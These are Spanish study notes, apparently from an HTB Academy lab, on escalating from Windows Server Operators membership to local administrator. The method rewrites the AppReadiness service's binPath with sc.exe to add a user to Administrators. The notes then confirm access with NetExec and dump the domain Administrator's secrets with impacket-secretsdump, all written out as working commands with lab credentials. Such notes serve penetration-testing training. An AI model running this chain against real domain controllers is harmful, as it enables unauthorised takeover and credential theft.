
## 1. Enumeración

Los miembros del grupo **Server Operators** tienen privilegios elevados sobre servidores Windows, incluidos los controladores de dominio (DC).

Este grupo dispone de:

- `SeBackupPrivilege`: permite realizar copias de seguridad de archivos protegidos.
    
- `SeRestorePrivilege`: permite restaurar archivos protegidos.
    
- Permisos para administrar determinados servicios de Windows.
    

Podemos aprovechar estos permisos para modificar un servicio que se ejecute como `SYSTEM` y escalar privilegios.

### Comprobar grupos y privilegios

```
whoami /groups
whoami /priv
```

Buscar:

```
BUILTIN\Server Operators
SeBackupPrivilege
SeRestorePrivilege
```

## 2. Enumerar servicios vulnerables

### Consultar la configuración de un servicio

```
sc.exe qc AppReadiness
```

Nos interesa especialmente:

```
SERVICE_START_NAME : LocalSystem
BINARY_PATH_NAME   : C:\Windows\System32\svchost.exe -k AppReadiness -p
```

`**LocalSystem**` **significa que el servicio se ejecuta como** `**NT AUTHORITY\SYSTEM**`**.**

### Comprobar los permisos sobre el servicio

Utilizando `PsService` de Sysinternals:

```
C:\Tools\PsService.exe security AppReadiness
```

Buscar:

```
[ALLOW] BUILTIN\Server Operators
        All
```

Esto indica que el grupo tiene `SERVICE_ALL_ACCESS` sobre el servicio.

**Importante:** para esta técnica necesitamos permisos para modificar la configuración del servicio, no solamente para iniciarlo o detenerlo.

## 3. Explotación: modificar el binario del servicio

### Paso 1. Comprobar los administradores locales

```
net localgroup Administrators
```

Verificamos que nuestro usuario todavía no pertenece al grupo.

### Paso 2. Modificar el binPath

Cambiamos el ejecutable del servicio por un comando que añada nuestro usuario al grupo `Administrators`.

```
sc.exe config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"
```

**Parámetros importantes:**

- `config`: modifica la configuración del servicio.
    
- `binPath=`: establece el comando que ejecutará el servicio.
    
- `cmd /c`: ejecuta el comando y termina.
    
- `net localgroup Administrators server_adm /add`: añade `server_adm` al grupo de administradores locales.
    

**Nota:** debe existir un espacio después de `binPath=`.

### Paso 3. Iniciar el servicio

```
sc.exe start AppReadiness
```

Es posible recibir el siguiente error:

```
[SC] StartService FAILED 1053
```

Esto ocurre porque el comando ejecutado no funciona como un servicio convencional de Windows.

**El error 1053 no significa necesariamente que la explotación haya fallado.** El comando puede haberse ejecutado correctamente antes de producirse el error.

### Paso 4. Verificar la escalada

```
net localgroup Administrators
```

Resultado esperado:

```
Members
---------------------------------------
Administrator
Domain Admins
Enterprise Admins
server_adm
```

Nuestro usuario ahora pertenece al grupo `Administrators`.

## 4. Verificar el acceso administrativo desde Linux

Podemos utilizar NetExec:

```
nxc smb 10.129.43.9 -u server_adm -p 'HTB_@cademy_stdnt!'
```

Resultado esperado:

```
[+] INLANEFREIGHT.LOCAL\server_adm:HTB_@cademy_stdnt! (Pwn3d!)
```

`Pwn3d!` indica que NetExec ha identificado acceso administrativo mediante SMB.

En un controlador de dominio, conseguir estos privilegios puede permitir acceder a información sensible de Active Directory.

---

## 5. Extracción de credenciales del DC

Una vez conseguido acceso administrativo al controlador de dominio, el material muestra cómo recuperar las credenciales de una cuenta concreta mediante Impacket:

```
impacket-secretsdump server_adm@10.129.43.9 -just-dc-user administrator
```

También puede utilizarse el nombre clásico del script:

```
secretsdump.py server_adm@10.129.43.9 -just-dc-user administrator
```

**Parámetros:**

- `server_adm@10.129.43.9`: usuario y controlador de dominio objetivo.
    
- `-just-dc-user administrator`: solicita los secretos de la cuenta `Administrator` del dominio.
    

La herramienta utiliza DRSUAPI para obtener información de credenciales desde Active Directory.

## 6. Resumen para el examen

|Elemento|Descripción|
|---|---|
|Grupo|`Server Operators`|
|Privilegios|`SeBackupPrivilege`, `SeRestorePrivilege`|
|Vector de ataque|Modificación de servicios|
|Herramienta de enumeración|`PsService.exe`|
|Comando de configuración|`sc.exe config`|
|Servicio utilizado|`AppReadiness`|
|Cuenta del servicio|`LocalSystem`|
|Objetivo|Añadir nuestro usuario a `Administrators`|
|Verificación|`net localgroup Administrators`|
|Postexplotación|`impacket-secretsdump`|

## 7. Comandos esenciales

```
:: Enumerar grupos y privilegios
whoami /groups
whoami /priv

:: Consultar configuración del servicio
sc.exe qc AppReadiness

:: Comprobar permisos
C:\Tools\PsService.exe security AppReadiness

:: Consultar administradores
net localgroup Administrators

:: Modificar el binario del servicio
sc.exe config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"

:: Ejecutar el servicio
sc.exe start AppReadiness

:: Verificar escalada
net localgroup Administrators
```

### Desde Linux

```
# Verificar acceso administrativo
nxc smb 10.129.43.9 -u server_adm -p 'HTB_@cademy_stdnt!'

# Extraer credenciales de Administrator del dominio
impacket-secretsdump server_adm@10.129.43.9 -just-dc-user administrator
```

### Punto importante

**La pertenencia a** `**Server Operators**` **no nos convierte directamente en administradores.**

Sin embargo, si podemos modificar la configuración de un servicio que se ejecuta como `SYSTEM`, podemos aprovecharlo para ejecutar comandos con esos privilegios.

En esta sección, el ataque consiste en:

**Server Operators → SERVICE_ALL_ACCESS → modificar binPath → ejecutar como SYSTEM → Administrators.**
